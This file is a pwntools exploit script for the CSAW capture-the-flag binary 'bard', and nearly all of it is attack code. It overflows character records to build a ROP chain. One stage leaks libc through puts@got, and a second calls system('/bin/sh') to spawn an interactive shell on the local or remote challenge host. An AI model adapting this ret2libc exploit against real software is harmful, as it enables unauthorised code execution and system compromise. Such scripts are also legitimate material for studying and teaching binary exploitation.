from pwn import *

e = ELF("./bard")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("pwn.chal.csaw.io", 5019)
else:
  p = process(e.path, env={"LD_PRELOAD": libc.path})

for i in range(7):
  p.sendlineafter("alignment", "e")
  p.sendlineafter("weapon:", "1")
  p.sendlineafter("name:", "AAAA")

p.sendlineafter("alignment", "g")
p.sendlineafter("weapon:", "1")
p.sendlineafter("name:", "BBBB")

debug()

p.sendlineafter("alignment", "e")
p.sendlineafter("weapon:", "1")
p.sendlineafter("name:", "AAAA")

rdi = 0x00401143    
p.sendlineafter("alignment", "g")
p.sendlineafter("weapon:", "1")
p.sendafter("name:", p64(rdi) + p64(e.got["puts"]) + p64(e.symbols["puts"]) + p64(0x400f7c))


for i in range(10):
  p.sendlineafter("Options:", "r")

p.recvuntil("away")
p.recvline()

leak = u64(p.recvline(keepends=False).ljust(8, "\x00")) - libc.symbols["puts"]
print(hex(leak))


for i in range(7):
  p.sendlineafter("alignment", "e")
  p.sendlineafter("weapon:", "1")
  p.sendlineafter("name:", "AAAA")

p.sendlineafter("alignment", "g")
p.sendlineafter("weapon:", "1")
p.sendlineafter("name:", "BBBB")

p.sendlineafter("alignment", "e")
p.sendlineafter("weapon:", "1")
p.sendlineafter("name:", "AAAA")

rdi = 0x00401143    
p.sendlineafter("alignment", "g")
p.sendlineafter("weapon:", "1")
p.sendafter("name:", p64(rdi + 1) + p64(rdi) + p64(leak + next(libc.search("/bin/sh"))) + p64(leak + libc.symbols["system"]))

for i in range(10):
  p.sendlineafter("Options:", "r")

p.interactive()
